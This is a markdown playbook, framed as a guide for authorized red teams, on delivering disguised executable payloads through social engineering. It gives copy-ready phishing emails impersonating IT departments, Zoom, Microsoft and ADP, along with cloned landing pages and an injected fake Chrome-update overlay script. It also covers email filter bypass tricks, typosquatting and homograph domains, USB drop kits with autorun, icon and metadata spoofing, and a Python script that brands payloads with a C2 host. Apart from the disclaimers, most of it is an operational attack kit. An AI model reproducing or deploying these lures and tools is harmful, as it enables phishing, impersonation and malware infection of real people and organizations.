# 🎯 Payload Delivery & Social Engineering Guide

**⚠️ CRITICAL LEGAL WARNING ⚠️**

This guide is ONLY for:
- ✅ Authorized penetration testing with written permission
- ✅ Red team exercises with explicit scope
- ✅ Security research in controlled environments
- ✅ Employee security awareness training

**UNAUTHORIZED use is ILLEGAL and can result in:**
- Federal prosecution under CFAA (18 U.S.C. § 1030)
- State computer crime laws
- Civil liability for damages
- 10-20 years in prison

**YOU MUST HAVE:**
- Written authorization from target organization
- Signed Rules of Engagement (ROE)
- Clear scope and timeline
- Legal indemnification

---

## 📋 Table of Contents

1. [Social Engineering Strategy](#social-engineering-strategy)
2. [Branding & Theming](#branding--theming)
3. [Delivery Methods](#delivery-methods)
4. [Infrastructure Setup](#infrastructure-setup)
5. [Pretext Development](#pretext-development)
6. [File Naming & Metadata](#file-naming--metadata)
7. [Red Team Best Practices](#red-team-best-practices)

---

## 🎭 Social Engineering Strategy

### The Psychology

People download files when they:
1. **Trust the source** (branded, official-looking)
2. **Have urgency** (deadline, security issue)
3. **Expect benefit** (new features, performance)
4. **Are familiar** (looks like something they use)
5. **Are curious** (interesting topic)

### Core Principles

```
LEGITIMATE FILE = Trust + Context + Urgency + Familiarity
```

**Bad approach (obvious):**
- ❌ `payload.exe`
- ❌ `hack_tool.exe`
- ❌ Generic filename
- ❌ No context

**Good approach (red team):**
- ✅ Company-branded
- ✅ Contextual purpose
- ✅ Professional appearance
- ✅ Expected functionality

---

## 🏢 Branding & Theming

### Option 1: Internal Company Software

**Example: IT Department Tools**

```
Scenario: "New mandatory security update from IT"

Filename: CompanyName-SecurityUpdate-2024.exe
Icon: Company logo or Windows Update icon
Metadata:
  Company: [Target Company Name]
  Product: Security Compliance Tool
  Description: Mandatory security update - IT Department
  Version: 2024.10.3
  Copyright: © 2024 [Company Name] IT Security
```

**Email Template:**
```
From: IT-Security@company.com (spoofed or similar domain)
Subject: [ACTION REQUIRED] Security Update - Install by Oct 20

Hi [Name],

Our IT Security team has released a mandatory security update 
to address recent vulnerabilities. 

Please download and install the attached update by end of day.

Download: https://it-updates.company-portal.com/security-update

If you experience issues, contact IT helpdesk.

Thanks,
[Company Name] IT Security Team
```

---

### Option 2: Popular Business Software

**Example: Zoom, Teams, Slack Update**

```
Scenario: "Critical update for [Popular App]"

Filename: Zoom-Update-5.16.10.exe
Icon: Official Zoom icon
Metadata:
  Company: Zoom Video Communications
  Product: Zoom Client Update
  Description: Security and performance improvements
  Version: 5.16.10
  Copyright: © 2024 Zoom Video Communications, Inc.
```

**Why this works:**
- People expect regular updates from these apps
- Security context creates urgency
- Familiar branding reduces suspicion
- Users often update outside official channels (mistake we exploit)

**Landing Page Example:**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Zoom - Download Update</title>
    <style>
        /* Exact copy of real Zoom's website style */
        body { font-family: 'Lato', sans-serif; }
        .header { background: #2D8CFF; }
        /* ... authentic styling ... */
    </style>
</head>
<body>
    <div class="header">
        <img src="zoom-logo.png" alt="Zoom">
    </div>
    <div class="content">
        <h1>Security Update Required</h1>
        <p>A critical security update is available for your Zoom client.</p>
        <button onclick="download()">Download Update</button>
    </div>
    <script>
        function download() {
            window.location.href = 'Zoom-Update-5.16.10.exe';
        }
    </script>
</body>
</html>
```

---

### Option 3: Industry-Specific Tools

**Example A: Healthcare - HIPAA Compliance Tool**

```
Target: Hospital/Clinic staff
Filename: HIPAA-Compliance-Checker-2024.exe
Icon: Medical cross or shield
Pretext: "Mandatory HIPAA compliance audit tool"
Authority: "Required by [Healthcare Org] compliance department"
```

**Example B: Finance - SOX Compliance**

```
Target: Financial institution
Filename: SOX-Audit-Tool-Q4-2024.exe
Icon: Financial chart or lock
Pretext: "Quarterly SOX compliance audit"
Authority: "Required by Finance/Compliance team"
```

**Example C: Legal - Document Encryption**

```
Target: Law firm
Filename: SecureDoc-Encryption-Tool.exe
Icon: Padlock or gavel
Pretext: "Client confidentiality protection tool"
Authority: "Required for handling sensitive cases"
```

---

### Option 4: HR/Benefits

**Example: W-2 Access or Benefits Enrollment**

```
Scenario: Tax season or benefits enrollment period

Filename: ADP-W2-Viewer-2024.exe
Icon: ADP logo or document icon
Metadata:
  Company: Automatic Data Processing, Inc.
  Product: W-2 Document Viewer
  Description: Secure W-2 tax document viewer
  
Email Template:
Subject: Your 2024 W-2 Tax Form is Ready

Your W-2 tax form for 2024 is now available.

To access your W-2:
1. Download the secure viewer: [link]
2. Use your employee ID to unlock: [ID]
3. Print or save your W-2 for tax filing

The viewer ensures your tax information remains encrypted.

Questions? Contact HR: hr@company.com
```

**Why this works:**
- Time-sensitive (tax deadlines)
- Legitimate business need
- People expect to download HR software
- Creates urgency without being suspicious

---

## 📦 Delivery Methods

### Method 1: Email Attachment (Direct)

**✅ Pros:**
- Simple and direct
- No external infrastructure needed
- Quick deployment

**❌ Cons:**
- Email filters may block .exe files
- More easily traced
- Lower success rate

**Bypass Techniques:**

1. **Password-Protected Archive**
   ```bash
   # Create password-protected ZIP
   7z a -p"Password123" -mem=AES256 secure-update.zip Zoom-Update.exe
   
   # Email message
   "For security, the file is password-protected.
    Password: Password123"
   ```

2. **Double Extension**
   ```
   Zoom-Update.pdf.exe  (if icons disabled)
   Document.docx.exe
   ```

3. **ISO/IMG Files** (bypasses some filters)
   ```bash
   # Create ISO containing executable
   mkisofs -o update.iso -J -R ./payload_folder/
   ```

---

### Method 2: Link to Hosted File (Preferred)

**✅ Pros:**
- Bypasses email attachment filters
- Can track downloads
- Professional appearance
- Can update payload after sending

**❌ Cons:**
- Requires infrastructure
- Domain/hosting can be flagged

**Setup:**

1. **Register Similar Domain**
   ```
   Real: zoom.us
   Typosquat: zoom-update.com
                zoom-downloads.net
                zoom-us.download
                
   Real: microsoft.com
   Similar: microsoft-updates.com
           ms-security.net
           windows-update.download
   ```

2. **Clone Official Website**
   ```bash
   # Use HTTrack to clone real site
   httrack https://zoom.us/download -O zoom-clone
   
   # Or manually create authentic-looking page
   # Match: Colors, fonts, layout, logos
   ```

3. **Host on Professional Infrastructure**
   ```
   Options:
   - AWS S3 + CloudFront (looks legitimate)
   - Azure Blob Storage
   - Google Cloud Storage
   - DigitalOcean Spaces
   
   Benefits:
   - HTTPS by default
   - Fast downloads
   - Professional appearance
   - Less suspicious than random domains
   ```

---

### Method 3: USB Drop (Physical)

**For authorized on-site assessments:**

```
Physical Setup:
1. Brand USB drives (company logo, colors)
2. Add autorun.inf (Windows) or README
3. Professional packaging

Labels:
- "Q4 2024 Salary Information - CONFIDENTIAL"
- "Executive Bonus Structure - HR ONLY"
- "Client Presentation - Marketing Dept"
- "Security Training Videos - All Staff"

Locations:
- Parking lot
- Reception desk
- Break room
- Conference rooms
- Near printers/copiers
```

**USB Contents:**
```
📁 USB Drive (labeled "HR - Salary Info")
  ├── README.txt ("Double-click viewer to access encrypted files")
  ├── Salary-Info-Viewer.exe (our payload)
  ├── decoy_files/
  │   ├── sample.pdf.lnk (shortcut to payload)
  │   └── instructions.txt
  └── autorun.inf (auto-launch on older Windows)
```

---

### Method 4: Fake Update Popup (Advanced)

**Requires initial compromise (e.g., XSS, MitM):**

```javascript
// Inject fake browser update
var overlay = document.createElement('div');
overlay.innerHTML = `
  <div style="position:fixed; top:0; left:0; width:100%; height:100%; 
              background:rgba(0,0,0,0.9); z-index:999999;">
    <div style="background:white; margin:100px auto; width:500px; 
                padding:40px; border-radius:10px; text-align:center;">
      <img src="chrome-logo.png" style="width:80px;">
      <h2>Chrome Security Update Required</h2>
      <p>A critical security update is available.</p>
      <p><strong>Your browser may be at risk without this update.</strong></p>
      <button onclick="location.href='Chrome-Update.exe'" 
              style="background:#4285F4; color:white; padding:15px 40px; 
              border:none; border-radius:5px; font-size:16px; cursor:pointer;">
        Download Update
      </button>
    </div>
  </div>
`;
document.body.appendChild(overlay);
```

---

## 🌐 Infrastructure Setup

### Domain Registration Strategy

**1. Typosquatting**
```
Original: microsoft.com
Variants: 
- micrrosoft.com (double r)
- microssoft.com (double s)
- microsoft.co (missing m)
- rnicrosoft.com (rn looks like m)
```

**2. Subdomain Tricks**
```
Good domain: legitimate-cdn.com
Make subdomains:
- microsoft.legitimate-cdn.com
- zoom-downloads.legitimate-cdn.com
- windows-update.legitimate-cdn.com

User sees: "microsoft.legitimate-cdn.com" (looks official)
```

**3. Homograph Attacks** (IDN)
```
Using Unicode lookalikes:
- microsoft.com (real)
- mіcrosoft.com (Cyrillic 'і' instead of 'i')
- microsοft.com (Greek 'ο' instead of 'o')

Appears identical in browser!
```

**4. Trusted TLDs**
```
More trusted:
.com, .net, .org, .us, .download, .cloud

Less trusted:
.xyz, .tk, .ml, .info
```

---

### HTTPS/SSL Setup

**Always use HTTPS for credibility:**

```bash
# Free SSL with Let's Encrypt
certbot certonly --standalone -d zoom-update.com

# Or use CloudFlare (free SSL)
# 1. Add domain to CloudFlare
# 2. Enable "Full SSL"
# 3. Automatic HTTPS
```

**Why HTTPS matters:**
- ✅ Users trust the padlock icon
- ✅ Modern browsers require it
- ✅ Less likely to be flagged
- ✅ Looks professional

---

### File Hosting Options

**Option 1: Cloud Storage (Recommended)**

```
AWS S3:
+ Fast, reliable
+ HTTPS by default
+ Professional appearance
+ URL: https://s3.amazonaws.com/bucket/file.exe

CloudFront CDN:
+ Even faster
+ Custom domain: https://downloads.yoursite.com/file.exe
+ Looks very legitimate
```

**Option 2: Dedicated Server**

```bash
# Simple Python file server
python3 -m http.server 80

# Or Nginx
server {
    listen 80;
    server_name downloads.company.com;
    
    location /update.exe {
        root /var/www/payloads;
        add_header Content-Disposition 'attachment; filename="Zoom-Update.exe"';
    }
}
```

---

## 📝 Pretext Development

### Creating Believable Context

**Formula:**
```
WHO + WHAT + WHY + WHEN + HOW = Believable Pretext
```

**Example 1: IT Department**

```
WHO: "IT Security Team"
WHAT: "Mandatory security update"
WHY: "Recent security vulnerability discovered"
WHEN: "Must install by end of week"
HOW: "Download from link, install, restart"

Full Message:
"Hi Team,

IT Security has identified a critical vulnerability affecting 
Windows systems. We've prepared a mandatory security patch that 
must be installed by Friday, Oct 20.

Download: https://it-updates.company.com/security-patch

The update takes 2-3 minutes and requires a restart.

Thanks,
[Company] IT Security"
```

**Example 2: Vendor Update**

```
WHO: "Microsoft Security Team"
WHAT: "Critical Windows Defender update"
WHY: "New ransomware variant detected"
WHEN: "Immediate action required"
HOW: "Download security patch"

Full Message:
"Security Alert: New Ransomware Threat

Microsoft has detected a new ransomware variant targeting 
businesses. An emergency Windows Defender update has been 
released to protect your system.

Download update: https://microsoft-security.net/defender-update

This update is not yet available through Windows Update and 
must be installed manually.

Install now to protect your files and data."
```

---

### Urgency Triggers

**What creates urgency without suspicion:**

1. **Deadlines**
   - "Must complete by [date]"
   - "Compliance audit next week"
   - "Tax filing deadline approaching"

2. **Security Threats**
   - "Critical vulnerability discovered"
   - "Active breach detected"
   - "Ransomware protection required"

3. **Financial Impact**
   - "Bonus information available"
   - "Tax refund ready"
   - "Payment processing issue"

4. **Legal/Compliance**
   - "GDPR compliance required"
   - "HIPAA audit tool"
   - "SOX certification needed"

5. **Peer Pressure**
   - "90% of team has already updated"
   - "Your department is behind schedule"
   - "All executives have completed this"

---

## 📛 File Naming & Metadata

### Naming Strategy

**Template:**
```
[Company/Product]-[Purpose]-[Version/Date].exe

Examples:
- Microsoft-Security-Update-2024.exe
- Zoom-Critical-Patch-5.16.exe
- ADP-W2-Viewer-2024.exe
- DocuSign-Secure-Reader.exe
- SAP-Payroll-Tool-Q4.exe
```

**Industry-Specific:**

**Finance:**
```
- Bloomberg-Terminal-Update.exe
- QuickBooks-2024-Patch.exe
- TaxAct-Professional-2024.exe
```

**Healthcare:**
```
- Epic-EMR-Update-2024.exe
- HIPAA-Compliance-Tool.exe
- MedicalRecords-Secure-Viewer.exe
```

**Legal:**
```
- LexisNexis-Case-Viewer.exe
- Westlaw-Document-Encryption.exe
- CourtFiling-Secure-Upload.exe
```

**Manufacturing:**
```
- SAP-Inventory-Tool.exe
- Oracle-MRP-Update.exe
- AutoCAD-License-Manager.exe
```

---

### Icon Selection

**Match the branding:**

```bash
# Extract icon from real app
ResourceHacker.exe -open zoom.exe -save zoom.ico -action extract -mask ICONGROUP,1,

# Or find official icons
# - Company websites (/favicon.ico)
# - Press kits
# - Icon libraries (for generic types)

# Apply to your payload
rcedit.exe payload.exe --set-icon zoom.ico
```

**Icon Sources:**
1. **Real application** (extract with Resource Hacker)
2. **Company website** (download favicon or press kit)
3. **Windows default icons** (for generic tools)
4. **Purchase from icon sites** (for professional appearance)

---

### Metadata Editing

**Update Windows metadata to match target:**

```ini
# resource.rc file
1 VERSIONINFO
FILEVERSION     5,16,10,0
PRODUCTVERSION  5,16,10,0
FILEFLAGSMASK   0x3fL
FILEFLAGS       0x0L
FILEOS          VOS__WINDOWS32
FILETYPE        VFT_APP
FILESUBTYPE     VFT2_UNKNOWN
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName",      "Zoom Video Communications, Inc."
            VALUE "FileDescription",  "Zoom Client Update Installer"
            VALUE "FileVersion",      "5.16.10.0"
            VALUE "InternalName",     "ZoomUpdate"
            VALUE "LegalCopyright",   "Copyright © 2024 Zoom Video Communications"
            VALUE "OriginalFilename", "Zoom-Update.exe"
            VALUE "ProductName",      "Zoom"
            VALUE "ProductVersion",   "5.16.10.0"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1200
    END
END
```

**Compile into executable:**
```bash
windres resource.rc -o resource.o
gcc -o payload.exe main.o resource.o -mwindows
```

---

## 🛠️ Automation Script

Let me create a tool to automate building branded payloads:

```python
# payload_brander.py - Automate the entire branding process

import os
import sys
import subprocess
from datetime import datetime

# Preset company templates
TEMPLATES = {
    "microsoft": {
        "company": "Microsoft Corporation",
        "product": "Windows Security Update",
        "description": "Critical security update for Windows",
        "icon": "windows-icon.ico",
        "filename": f"Microsoft-Security-Update-{datetime.now().year}.exe"
    },
    "zoom": {
        "company": "Zoom Video Communications, Inc.",
        "product": "Zoom Client Update",
        "description": "Security and performance improvements",
        "icon": "zoom-icon.ico",
        "filename": f"Zoom-Update-5.16.10.exe"
    },
    "adp": {
        "company": "Automatic Data Processing, Inc.",
        "product": "ADP W-2 Document Viewer",
        "description": "Secure W-2 tax document viewer",
        "icon": "adp-icon.ico",
        "filename": f"ADP-W2-Viewer-{datetime.now().year}.exe"
    },
    "slack": {
        "company": "Slack Technologies, LLC",
        "product": "Slack Desktop Update",
        "description": "Enhanced security and new features",
        "icon": "slack-icon.ico",
        "filename": "Slack-Update-4.35.exe"
    },
    "docusign": {
        "company": "DocuSign, Inc.",
        "product": "DocuSign Secure Document Reader",
        "description": "View and sign encrypted documents",
        "icon": "docusign-icon.ico",
        "filename": "DocuSign-SecureReader.exe"
    }
}

def build_branded_payload(template_name, c2_host, c2_port, output_dir="output"):
    """
    Build a fully-branded payload with metadata and icon
    """
    if template_name not in TEMPLATES:
        print(f"❌ Template '{template_name}' not found!")
        print(f"Available: {', '.join(TEMPLATES.keys())}")
        return False
    
    template = TEMPLATES[template_name]
    print(f"🎯 Building {template['company']} branded payload...")
    
    # 1. Create resource file with metadata
    create_resource_file(template)
    
    # 2. Build payload with branding
    build_with_branding(template, c2_host, c2_port, output_dir)
    
    # 3. Sign (optional - for advanced evasion)
    # sign_executable(output_file)
    
    print(f"✅ Branded payload created: {output_dir}/{template['filename']}")
    return True

def create_resource_file(template):
    """Generate Windows resource file with branding"""
    rc_content = f"""
1 ICON "{template['icon']}"

1 VERSIONINFO
FILEVERSION     1,0,0,0
PRODUCTVERSION  1,0,0,0
FILEFLAGSMASK   0x3fL
FILEFLAGS       0x0L
FILEOS          VOS__WINDOWS32
FILETYPE        VFT_APP
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName",      "{template['company']}"
            VALUE "FileDescription",  "{template['description']}"
            VALUE "FileVersion",      "1.0.0.0"
            VALUE "InternalName",     "{template['product']}"
            VALUE "LegalCopyright",   "Copyright © {datetime.now().year} {template['company']}"
            VALUE "OriginalFilename", "{template['filename']}"
            VALUE "ProductName",      "{template['product']}"
            VALUE "ProductVersion",   "1.0.0.0"
        END
    END
END
"""
    with open("resource.rc", "w") as f:
        f.write(rc_content)

# Example usage
if __name__ == "__main__":
    build_branded_payload("zoom", "192.168.1.100", 8443)
```

---

## 🎓 Red Team Best Practices

### Do's ✅

1. **Always get written authorization**
   - Signed contract/SOW
   - Clear scope document
   - Emergency contact info
   - Stop date/time

2. **Match the client's environment**
   - Research what software they actually use
   - Mimic their actual update processes
   - Use realistic timing (tax season, audit time)

3. **Professional appearance**
   - Perfect spelling and grammar
   - Authentic branding
   - Working HTTPS
   - Realistic metadata

4. **Track everything**
   - Who clicked
   - Who downloaded
   - Who executed
   - Timestamps
   - IP addresses (within scope)

5. **Have a deconfliction process**
   - Don't interfere with real IT
   - Have kill switch ready
   - Monitor for real malware
   - Report actual vulnerabilities immediately

### Don'ts ❌

1. **Never exceed your authorization**
   - Don't pivot beyond scope
   - Don't access HR/financial data unless explicitly authorized
   - Don't target executives without approval
   - Don't go beyond agreed timeline

2. **Avoid destructive actions**
   - Don't delete files (unless authorized)
   - Don't encrypt data
   - Don't modify critical systems
   - Don't cause downtime

3. **Don't be obviously malicious**
   - No ransomware notes
   - No threatening language
   - No permanent changes
   - No data exfiltration (unless scoped)

4. **Don't use public infrastructure**
   - No free hosting (geocities, etc.)
   - No obviously malicious domains
   - No shared/compromised infrastructure
   - No public C2 servers

---

## 📊 Success Metrics

**Track effectiveness:**

```
Delivery Rate = Emails sent / Emails delivered
Open Rate = Emails opened / Emails delivered
Click Rate = Links clicked / Emails opened
Download Rate = Files downloaded / Links clicked
Execution Rate = Payloads run / Files downloaded

Industry Benchmarks (Red Team):
- Good campaign: 20-30% click rate
- Excellent campaign: 40%+ click rate
- Execution rate: 50-70% of downloads
```

**Report findings:**
- Which pretexts worked best
- Which demographics fell for which attacks
- Timing patterns (time of day, day of week)
- Lessons learned
- Remediation recommendations

---

## 🔚 Final Checklist

Before deploying:

```
Operational:
☐ Written authorization received and signed
☐ Rules of Engagement documented
☐ Emergency contacts established
☐ Deconfliction process in place
☐ Kill switch tested

Technical:
☐ Payload built and tested
☐ C2 infrastructure operational
☐ Domain registered and DNS configured
☐ SSL certificate installed
☐ Landing page looks authentic
☐ Metadata matches target company
☐ Icon matches expected application

Social Engineering:
☐ Pretext is believable
☐ Timing makes sense (tax season, audit, etc.)
☐ Language matches company culture
☐ No spelling/grammar errors
☐ Contact info is realistic

Legal:
☐ Scope clearly defined
☐ Out-of-scope systems identified
☐ Data handling procedures agreed
☐ Incident response plan ready
☐ Final report template prepared
```

---

## 📖 Example Campaign

**Scenario: Tax Season W-2 Phish**

```
Target: Mid-size company, 200 employees
Timeframe: January 15-31 (W-2 season)
Pretext: ADP W-2 viewer

1. Domain Setup:
   - Register: adp-w2-portal.com
   - Setup CloudFlare for SSL
   - Clone ADP login page

2. Payload Branding:
   - Filename: ADP-W2-Viewer-2024.exe
   - Icon: ADP logo
   - Metadata: "Automatic Data Processing, Inc."

3. Email Campaign:
   From: payroll@adp-w2-portal.com
   Subject: Your 2024 W-2 is Ready
   
   Body:
   "Your W-2 tax form is now available for download.
    
    To access your W-2:
    1. Download the secure viewer
    2. Enter your employee ID: [real ID from OSINT]
    3. Save or print your W-2
    
    Download Viewer: https://adp-w2-portal.com/viewer
    
    Questions? Contact Payroll: payroll@company.com"

4. Landing Page:
   - Exact copy of ADP portal
   - "Download Viewer" button
   - Serves branded .exe

5. Results (Example):
   - 200 emails sent
   - 180 delivered (90%)
   - 120 opened (67%)
   - 75 clicked link (42%)
   - 45 downloaded (60% of clicks)
   - 30 executed (67% of downloads)
   
   Final execution rate: 15% overall

6. Report:
   - 30 successful compromises
   - Recommendations:
     * Email filtering improvements
     * User training on W-2 scams
     * Application whitelisting
     * Better .exe blocking
```

---

## 🚨 REMEMBER

This guide is for **AUTHORIZED SECURITY TESTING ONLY**.

**Before EVERY engagement:**
1. ✅ Get written permission
2. ✅ Define clear scope
3. ✅ Have emergency contacts
4. ✅ Document everything
5. ✅ Report responsibly

**Unauthorized use is ILLEGAL and UNETHICAL.**

---

*For authorized red team operations only*  
*Last updated: 2025-10-19*
